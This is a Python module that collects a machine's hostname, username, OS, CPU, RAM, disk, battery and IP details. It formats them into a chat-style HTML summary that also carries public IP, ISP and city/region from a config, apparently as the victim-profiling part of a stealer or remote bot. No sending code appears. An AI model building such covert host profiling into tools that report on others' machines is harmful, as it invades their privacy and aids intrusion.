import psutil
import platform
import getpass
import socket
import datetime
import subprocess
import os


class SystemInfo:
    def __init__(self, config):
        self.config = config
        self.detailed_info = self._collect_detailed_info()

    def _collect_detailed_info(self):
        info = {}

        info["time"] = datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
        info["hostname"] = platform.node()
        info["username"] = getpass.getuser()
        info["os"] = f"{platform.system()} {platform.release()} {platform.version()}"

        cpu_info = psutil.cpu_freq()
        info["cpu_model"] = platform.processor()
        info["cpu_cores"] = psutil.cpu_count(logical=False)
        info["cpu_threads"] = psutil.cpu_count()
        info["cpu_usage"] = f"{psutil.cpu_percent(interval=0.5):.1f}%"
        info["cpu_freq"] = f"{cpu_info.current:.0f}MHz" if cpu_info else "N/A"

        memory = psutil.virtual_memory()
        info["ram_total"] = f"{memory.total // (1024 ** 3):.1f}GB"
        info["ram_used"] = f"{memory.used // (1024 ** 3):.1f}GB ({memory.percent:.1f}%)"
        info["ram_free"] = f"{memory.available // (1024 ** 3):.1f}GB ({100 - memory.percent:.1f}%)"

        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                total_gb = usage.total // (1024 ** 3)
                used_gb = usage.used // (1024 ** 3)
                free_gb = usage.free // (1024 ** 3)
                pct = (usage.used / usage.total) * 100

                disks.append({
                    "drive": partition.device,
                    "mount": partition.mountpoint,
                    "total": f"{total_gb}GB",
                    "used": f"{used_gb}GB ({pct:.1f}%)",
                    "free": f"{free_gb}GB"
                })
            except:
                pass
        info["disks"] = disks


        try:
            battery = psutil.sensors_battery()
            info["battery"] = f"{battery.percent:.1f}%" if battery else "N/A"
            info["charging"] = "🔌 Charging" if battery and battery.power_plugged else "🔋 Battery"
        except:
            info["battery"] = "N/A"
            info["charging"] = "N/A"

        try:
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            info["local_ip"] = "Unknown"

        return info

    def get_summary(self):
        disks_summary = self._format_disks()
        return f"""🕒 <b>{self.detailed_info['time']}</b>
🖥️ <b>{self.detailed_info['hostname']}</b> | 👤 <b>{self.detailed_info['username']}</b>

🌐 <code>{self.config.Ip}</code> | 🏢 {self.config.org}
🌍 <b>{self.config.city}, {self.config.region}</b>

💻 <b>{self.detailed_info['os']}</b>
🧠 <b>{self.detailed_info['cpu_model'][:30]}...</b>
⚡ <b>{self.detailed_info['cpu_threads']} threads</b> | {self.detailed_info['cpu_usage']}

🧠 <b>RAM:</b> {self.detailed_info['ram_used']} <b>Free:</b> {self.detailed_info['ram_free']}

💾 <b>DISKS:</b>
{disks_summary}

🔋 <b>{self.detailed_info['battery']} {self.detailed_info['charging']}</b>"""

    def _format_disks(self):
        disks = []
        for disk in self.detailed_info["disks"][:3]:
            disks.append(f"  {disk['drive']}: {disk['used']} <b>Free:</b> {disk['free']}")
        return "\n".join(disks)

    def get_full_report(self):
        """For TXT file"""
        report = []
        report.append(f"🧠 CPU: {self.detailed_info['cpu_model']}")
        report.append(f"   Threads: {self.detailed_info['cpu_threads']} | Usage: {self.detailed_info['cpu_usage']}")
        report.append(f"   Freq: {self.detailed_info['cpu_freq']}")

        report.append(
            f"\n🧠 RAM: Total {self.detailed_info['ram_total']} | Used {self.detailed_info['ram_used']} | Free {self.detailed_info['ram_free']}")

        report.append("\n💾 ALL DISKS:")
        for disk in self.detailed_info["disks"]:
            report.append(
                f"  {disk['drive']} ({disk['mount']}): {disk['total']} | Used {disk['used']} | Free {disk['free']}")

        return "\n".join(report)